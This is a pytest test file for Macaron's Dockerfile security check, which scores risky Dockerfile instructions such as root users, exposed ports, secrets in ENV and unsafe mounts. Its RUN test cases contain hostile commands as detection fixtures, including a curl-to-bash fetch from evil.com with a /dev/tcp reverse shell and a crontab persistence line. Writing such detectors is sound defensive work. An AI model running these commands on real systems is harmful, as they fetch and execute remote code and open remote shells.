# Copyright (c) 2022 - 2025, Oracle and/or its affiliates. All rights reserved.
# Licensed under the Universal Permissive License v 1.0 as shown at https://oss.oracle.com/licenses/upl/.

"""Module to test the Dockerfile security check."""

from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from macaron.database.table_definitions import Repository
from macaron.slsa_analyzer.checks.base_check import BaseCheck
from macaron.slsa_analyzer.checks.check_result import CheckResultType, Confidence
from macaron.slsa_analyzer.checks.insecure_patterns_dockerfile_check import (
    DockerfileSecurityAnalyzer,
    DockerfileSecurityCheck,
    DockerfileSecurityFacts,
)
from tests.conftest import MockAnalyzeContext


class TestDockerfileSecurityAnalyzer:
    """Test cases for DockerfileSecurityAnalyzer."""

    analyzer = DockerfileSecurityAnalyzer()

    def setup_method(self) -> None:
        """Set up test fixtures."""

    def test_analyze_empty_dockerfile(self) -> None:
        """Test analyzing an empty Dockerfile."""
        issues, risk_score, base_image, version = self.analyzer.analyze_dockerfile_content("")
        assert len(issues) == 0
        assert risk_score == 0
        assert base_image == "unknown"
        assert version == "unknown"

    def test_analyze_invalid_dockerfile(self) -> None:
        """Test analyzing an invalid Dockerfile."""
        invalid_content = "THIS IS NOT VALID DOCKERFILE CONTENT {{{invalid json"
        _, _, base_image, version = self.analyzer.analyze_dockerfile_content(invalid_content)
        # Should handle parse errors gracefully
        assert base_image == "unknown"
        assert version == "unknown"

    @pytest.mark.parametrize(
        ("dockerfile_content", "expected_base_image", "expected_version", "min_risk_score"),
        [
            pytest.param("FROM ubuntu:latest\nRUN apt-get update", "ubuntu", "latest", 15, id="test_from_latest_tag"),
            pytest.param("FROM ubuntu\nRUN apt-get update", "ubuntu", "latest", 15, id="test_from_no_tag"),
            pytest.param("FROM ubuntu:16.04\nRUN apt-get update", "ubuntu", "16.04", 25, id="test_from_old_image"),
            pytest.param(
                "FROM python:2.7-slim\nRUN pip install requests",
                "python",
                "2.7-slim",
                25,
                id="test_from_deprecated_python",
            ),
        ],
    )
    def test_from_instruction_analysis(
        self, dockerfile_content: str, expected_base_image: str, expected_version: str, min_risk_score: int
    ) -> None:
        """Test FROM instruction analysis with various scenarios."""
        issues, risk_score, base_image, version = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        assert base_image == expected_base_image
        assert version == expected_version
        assert risk_score >= min_risk_score
        assert any(issue["instruction"] == "FROM" for issue in issues)

    @pytest.mark.parametrize(
        ("dockerfile_content", "expected_issue_count", "min_risk_score"),
        [
            pytest.param("FROM ubuntu:20.04\nUSER root\nRUN apt-get update", 1, 30, id="test_user_root"),
            pytest.param("FROM ubuntu:20.04\nUSER 0", 1, 30, id="test_user_numeric_root"),
            pytest.param("FROM ubuntu:20.04\nUSER appuser", 0, 0, id="test_user_non_root"),
        ],
    )
    def test_user_instruction_analysis(
        self, dockerfile_content: str, expected_issue_count: int, min_risk_score: int
    ) -> None:
        """Test USER instruction analysis."""
        issues, risk_score, _, _ = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        user_issues = [issue for issue in issues if issue["instruction"] == "USER"]
        assert len(user_issues) == expected_issue_count
        if expected_issue_count > 0:
            assert risk_score >= min_risk_score

    @pytest.mark.parametrize(
        ("expose_instruction", "expected_issues"),
        [
            pytest.param("EXPOSE 22", ["22"], id="test_expose_ssh"),
            pytest.param("EXPOSE 3306", ["3306"], id="test_expose_mysql"),
            pytest.param("EXPOSE 22 23", ["22", "23"], id="test_expose_multiple_risky"),
            pytest.param("EXPOSE 999", ["privileged port"], id="test_expose_privileged"),
            pytest.param("EXPOSE 80 443", [], id="test_expose_safe_ports"),
            pytest.param("EXPOSE 8080/tcp", [], id="test_expose_with_protocol"),
            pytest.param("EXPOSE 100-200", ["privileged port"], id="test_expose_port_range"),
        ],
    )
    def test_expose_instruction_analysis(self, expose_instruction: str, expected_issues: list[str]) -> None:
        """Test EXPOSE instruction analysis with various port configurations."""
        dockerfile_content = f"FROM ubuntu:20.04\n{expose_instruction}"
        issues, _, _, _ = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        expose_issues = [issue for issue in issues if issue["instruction"] == "EXPOSE"]

        if expected_issues:
            assert len(expose_issues) >= len(expected_issues)
            for expected in expected_issues:
                assert any(expected in issue["issue"] for issue in expose_issues)
        else:
            assert len(expose_issues) == 0

    @pytest.mark.parametrize(
        ("env_content", "expected_keywords"),
        [
            pytest.param("ENV DATABASE_PASSWORD=secret123", ["pass"], id="test_env_password"),
            pytest.param(
                "ENV API_KEY=abcd1234\nENV SESSION_TOKEN=xyz789",
                ["key", "session"],  # Both should be lowercase since content_lower is used
                id="test_env_multiple_sensitive",
            ),
            pytest.param("ENV MAINTAINER_EMAIL=admin@example.com", ["Email address"], id="test_env_email"),
            pytest.param("ENV NODE_ENV=production", [], id="test_env_safe"),
        ],
    )
    def test_env_instruction_analysis(self, env_content: str, expected_keywords: list[str]) -> None:
        """Test ENV instruction analysis for sensitive information."""
        dockerfile_content = f"FROM ubuntu:20.04\n{env_content}"
        issues, _, _, _ = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        env_issues = [issue for issue in issues if issue["instruction"] == "ENV"]

        if expected_keywords:
            assert len(env_issues) >= len(expected_keywords)
            for keyword in expected_keywords:
                assert any(keyword.lower() in issue["issue"].lower() for issue in env_issues)
        else:
            assert len(env_issues) == 0

    @pytest.mark.parametrize(
        ("volume_instruction", "expected_risk_score"),
        [
            pytest.param("VOLUME /var/run/docker.sock", 40, id="test_volume_docker_socket"),
            pytest.param('VOLUME ["/etc/docker", "/root/.ssh"]', 80, id="test_volume_multiple_unsafe"),
            pytest.param("VOLUME /proc", 40, id="test_volume_proc"),
            pytest.param("VOLUME /data", 0, id="test_volume_safe"),
        ],
    )
    def test_volume_instruction_analysis(self, volume_instruction: str, expected_risk_score: int) -> None:
        """Test VOLUME instruction analysis for unsafe mounts."""
        dockerfile_content = f"FROM ubuntu:20.04\n{volume_instruction}"
        _, risk_score, _, _ = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        assert risk_score >= expected_risk_score

    @pytest.mark.parametrize(
        ("copy_instruction", "expected_issue_type"),
        [
            pytest.param("COPY . /app", "entire build context", id="test_copy_all"),
            pytest.param("COPY .git /app/.git", "sensitive file", id="test_copy_git"),
            pytest.param("COPY id_rsa /root/.ssh/", "Security-critical file", id="test_copy_ssh_key"),
            pytest.param("COPY app.py /app/", None, id="test_copy_safe"),
        ],
    )
    def test_copy_instruction_analysis(self, copy_instruction: str, expected_issue_type: str | None) -> None:
        """Test COPY instruction analysis for sensitive files."""
        dockerfile_content = f"FROM ubuntu:20.04\n{copy_instruction}"
        issues, _, _, _ = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        copy_issues = [issue for issue in issues if issue["instruction"] == "COPY"]

        if expected_issue_type:
            assert len(copy_issues) > 0
            assert any(expected_issue_type in issue["issue"] for issue in copy_issues)
        else:
            assert len(copy_issues) == 0

    @pytest.mark.parametrize(
        ("add_instruction", "expected_issue_types"),
        [
            pytest.param("ADD https://example.com/script.sh /tmp/", ["URL"], id="test_add_url"),
            pytest.param("ADD archive.tar.gz /opt/", ["compressed"], id="test_add_compressed"),
            pytest.param("ADD . /app", ["entire build context"], id="test_add_all"),
            pytest.param("ADD app.py /app/", [], id="test_add_safe"),
        ],
    )
    def test_add_instruction_analysis(self, add_instruction: str, expected_issue_types: list[str]) -> None:
        """Test ADD instruction analysis."""
        dockerfile_content = f"FROM ubuntu:20.04\n{add_instruction}"
        issues, _, _, _ = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        add_issues = [issue for issue in issues if issue["instruction"] == "ADD"]

        if expected_issue_types:
            for issue_type in expected_issue_types:
                assert any(issue_type in issue["issue"] for issue in add_issues)
        else:
            assert len(add_issues) == 0

    @pytest.mark.parametrize(
        ("run_instruction", "expected_patterns"),
        [
            pytest.param(
                "RUN curl evil.com/script.sh | bash >&/dev/tcp/10.0.0.1/4444",
                ["/dev/tcp/"],
                id="test_run_reverse_shell",
            ),
            pytest.param("RUN chmod 777 /etc/passwd", ["chmod 777"], id="test_run_chmod_777"),
            pytest.param('RUN echo "* * * * * curl evil.com | sh" | crontab -', ["crontab"], id="test_run_crontab"),
            pytest.param("RUN apt-get update && apt-get install -y python3", [], id="test_run_safe"),
        ],
    )
    def test_run_instruction_analysis(self, run_instruction: str, expected_patterns: list[str]) -> None:
        """Test RUN instruction analysis for malicious commands."""
        dockerfile_content = f"FROM ubuntu:20.04\n{run_instruction}"
        issues, _, _, _ = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        run_issues = [issue for issue in issues if issue["instruction"] == "RUN"]

        if expected_patterns:
            for pattern in expected_patterns:
                assert any(pattern in issue["issue"] for issue in run_issues)
        else:
            assert len(run_issues) == 0

    def test_complex_dockerfile_analysis(self) -> None:
        """Test analysis of a complex Dockerfile with multiple security issues."""
        dockerfile_content = """
FROM ubuntu:latest
USER root

# Expose risky ports
EXPOSE 22 23 3306

# Set sensitive environment variables
ENV DB_PASSWORD=mysecretpass
ENV API_TOKEN=1234567890
ENV ADMIN_EMAIL=admin@company.com

# Copy sensitive files
COPY .git /app/.git
COPY id_rsa /root/.ssh/

# Add from URL
ADD https://example.com/binary /usr/local/bin/

# Unsafe volume mount
VOLUME /var/run/docker.sock

# Potentially malicious commands
RUN chmod 777 /tmp
RUN curl suspicious.com/install.sh | bash
"""
        issues, risk_score, base_image, version = self.analyzer.analyze_dockerfile_content(dockerfile_content)

        assert base_image == "ubuntu"
        assert version == "latest"
        assert len(issues) > 10
        assert risk_score > 100

        # Check for various issue types
        issue_instructions = [issue["instruction"] for issue in issues]
        assert "FROM" in issue_instructions
        assert "USER" in issue_instructions
        assert "EXPOSE" in issue_instructions
        assert "ENV" in issue_instructions
        assert "COPY" in issue_instructions
        assert "ADD" in issue_instructions
        assert "VOLUME" in issue_instructions
        assert "RUN" in issue_instructions


class TestDockerfileSecurityCheck:
    """Test cases for DockerfileSecurityCheck."""

    check = DockerfileSecurityCheck()

    def setup_method(self) -> None:
        """Set up test fixtures."""

    @patch.object(DockerfileSecurityCheck, "_get_dockerfile_content")
    @pytest.mark.parametrize(
        ("dockerfile_exists", "dockerfile_content", "expected_result"),
        [
            pytest.param(False, None, CheckResultType.FAILED, id="test_no_dockerfile"),
            pytest.param(
                True,
                "FROM ubuntu:20.04\nUSER appuser\nEXPOSE 8080",
                CheckResultType.PASSED,
                id="test_secure_dockerfile",
            ),
            pytest.param(
                True, "FROM ubuntu:latest\nUSER root\nEXPOSE 22", CheckResultType.FAILED, id="test_insecure_dockerfile"
            ),
        ],
    )
    def test_run_check_with_different_dockerfiles(
        self,
        mock_get_dockerfile_content: Mock,
        dockerfile_exists: bool,
        dockerfile_content: str | None,
        expected_result: CheckResultType,
        tmp_path: Path,
        macaron_path: Path,
    ) -> None:
        """Test run_check with different Dockerfile scenarios."""
        # Create mock context
        ctx = MockAnalyzeContext(macaron_path=macaron_path, output_dir=str(tmp_path))

        # Create a mock repository with fs_path
        mock_repo = Mock(spec=Repository)
        mock_repo.fs_path = str(tmp_path)

        # Create a mock component with the repository
        mock_component = Mock()
        mock_component.repository = mock_repo

        if dockerfile_exists:
            mock_get_dockerfile_content.return_value = dockerfile_content
        else:
            mock_get_dockerfile_content.return_value = None

        # Run the check
        result = self.check.run_check(ctx)

        assert result.result_type == expected_result

    def test_run_check_no_component(self, tmp_path: Path, macaron_path: Path) -> None:
        """Test run_check when component is None."""
        ctx = MockAnalyzeContext(macaron_path=macaron_path, output_dir=str(tmp_path))

        result = self.check.run_check(ctx)

        assert result.result_type == CheckResultType.FAILED
        assert len(result.result_tables) == 0

    @patch.object(DockerfileSecurityCheck, "_get_dockerfile_content")
    def test_run_check_with_subdirectory_dockerfile(
        self, mock_get_dockerfile_content: Mock, tmp_path: Path, macaron_path: Path
    ) -> None:
        """Test finding Dockerfile in subdirectory."""
        ctx = MockAnalyzeContext(macaron_path=macaron_path, output_dir=str(tmp_path))

        # Create mock repository
        mock_repo = Mock(spec=Repository)
        mock_repo.fs_path = str(tmp_path)

        mock_component = Mock()
        mock_component.repository = mock_repo

        # Mock the Dockerfile content
        mock_get_dockerfile_content.return_value = "FROM node:16\nUSER node"

        result = self.check.run_check(ctx)

        assert result.result_type == CheckResultType.PASSED
        assert len(result.result_tables) == 1

        facts = result.result_tables[0]
        assert isinstance(facts, DockerfileSecurityFacts)
        assert facts.base_image_name == "node"
        assert facts.base_image_version == "16"

    @patch.object(DockerfileSecurityCheck, "_get_dockerfile_content")
    @pytest.mark.parametrize(
        ("risk_score", "expected_result_type", "expected_confidence"),
        [
            pytest.param(0, CheckResultType.PASSED, Confidence.HIGH, id="test_no_risk"),
            pytest.param(30, CheckResultType.PASSED, Confidence.MEDIUM, id="test_low_risk"),
            pytest.param(60, CheckResultType.FAILED, Confidence.MEDIUM, id="test_medium_risk"),
            pytest.param(120, CheckResultType.FAILED, Confidence.HIGH, id="test_high_risk"),
        ],
    )
    def test_risk_score_to_result_mapping(
        self,
        mock_get_dockerfile_content: Mock,
        risk_score: int,
        expected_result_type: CheckResultType,
        expected_confidence: Confidence,
        tmp_path: Path,
        macaron_path: Path,
    ) -> None:
        """Test that risk scores map to correct result types and confidence levels."""
        ctx = MockAnalyzeContext(macaron_path=macaron_path, output_dir=str(tmp_path))

        mock_repo = Mock(spec=Repository)
        mock_repo.fs_path = str(tmp_path)
        mock_component = Mock()
        mock_component.repository = mock_repo

        # Create a Dockerfile that will produce the desired risk score
        if risk_score == 0:
            dockerfile_content = "FROM ubuntu:20.04\nUSER appuser"
        elif risk_score == 30:
            dockerfile_content = "FROM ubuntu:latest\nUSER root"
        elif risk_score == 60:
            dockerfile_content = "FROM ubuntu:latest\nUSER root\nEXPOSE 22"
        else:  # risk_score >= 100
            dockerfile_content = """
FROM ubuntu:latest
USER root
EXPOSE 22
ENV PASSWORD=secret
VOLUME /var/run/docker.sock
RUN chmod 777 /etc
"""

        # Mock the return value
        mock_get_dockerfile_content.return_value = dockerfile_content

        result = self.check.run_check(ctx)

        assert result.result_type == expected_result_type
        if result.result_tables:
            facts = result.result_tables[0]
            assert facts.confidence == expected_confidence

    def test_run_check_os_error_handling(self, tmp_path: Path, macaron_path: Path) -> None:
        """Test error handling when OS error occurs."""
        ctx = MockAnalyzeContext(macaron_path=macaron_path, output_dir=str(tmp_path))

        mock_repo = Mock(spec=Repository)
        mock_repo.fs_path = str(tmp_path)

        # Create a Dockerfile but make it unreadable
        dockerfile_path = tmp_path / "Dockerfile"
        dockerfile_path.write_text("FROM ubuntu:20.04")

        # Mock open to raise OSError
        with patch("builtins.open", side_effect=OSError("Permission denied")):
            result = self.check.run_check(ctx)

        assert result.result_type == CheckResultType.FAILED

    def test_check_metadata(self) -> None:
        """Test check metadata and configuration."""
        # Use the public interface method to get check_id

        # The check_id is accessible via get_check_id method or similar
        # For now, we'll just verify the check was properly initialized
        assert isinstance(self.check, BaseCheck)
        assert hasattr(self.check, "result_on_skip")
        assert self.check.result_on_skip == CheckResultType.FAILED

    @patch.object(DockerfileSecurityCheck, "_get_dockerfile_content")
    def test_security_issues_grouping(
        self, mock_get_dockerfile_content: Mock, tmp_path: Path, macaron_path: Path
    ) -> None:
        """Test that security issues are properly grouped by severity and instruction."""
        ctx = MockAnalyzeContext(macaron_path=macaron_path, output_dir=str(tmp_path))

        mock_repo = Mock(spec=Repository)
        mock_repo.fs_path = str(tmp_path)
        mock_component = Mock()
        mock_component.repository = mock_repo

        # Mock Dockerfile with multiple issues
        dockerfile_content = """
FROM ubuntu:latest
USER root
EXPOSE 22 3306
ENV PASSWORD=secret
ENV TOKEN=abcd1234
"""
        mock_get_dockerfile_content.return_value = dockerfile_content

        result = self.check.run_check(ctx)
        assert len(result.result_tables) > 0
        facts = result.result_tables[0]
        assert isinstance(facts, DockerfileSecurityFacts)

        security_issues = facts.security_issues
        assert "total_issues" in security_issues
        total_issues = security_issues.get("total_issues")
        assert isinstance(total_issues, int)
        assert total_issues > 0

        assert "issues_by_severity" in security_issues
        assert isinstance(security_issues["issues_by_severity"], dict)
        assert len(security_issues["issues_by_severity"]) > 0

        assert "issues_by_instruction" in security_issues
        assert isinstance(security_issues["issues_by_instruction"], dict)
        assert "FROM" in security_issues["issues_by_instruction"]
        assert "USER" in security_issues["issues_by_instruction"]
        assert "EXPOSE" in security_issues["issues_by_instruction"]
        assert "ENV" in security_issues["issues_by_instruction"]


class TestDockerfileSecurityFacts:
    """Test cases for DockerfileSecurityFacts ORM model."""

    def test_facts_creation(self) -> None:
        """Test creating DockerfileSecurityFacts instance."""
        security_issues = {
            "total_issues": 3,
            "risk_score": 45,
            "issues_by_severity": {"HIGH": 1, "MEDIUM": 2},
            "issues_by_instruction": {"FROM": 1, "USER": 1, "EXPOSE": 1},
            "detailed_issues": [
                {"severity": "HIGH", "instruction": "USER", "issue": "Running as root", "risk_points": "30"}
            ],
        }

        facts = DockerfileSecurityFacts(
            base_image_name="ubuntu",
            base_image_version="20.04",
            security_issues=security_issues,
            risk_score=45,
            issues_count=3,
            confidence=0.8,
        )

        assert facts.base_image_name == "ubuntu"
        assert facts.base_image_version == "20.04"
        assert facts.risk_score == 45
        assert facts.issues_count == 3
        assert facts.confidence == 0.8
        assert facts.security_issues["total_issues"] == 3
        assert facts.security_issues["risk_score"] == 45
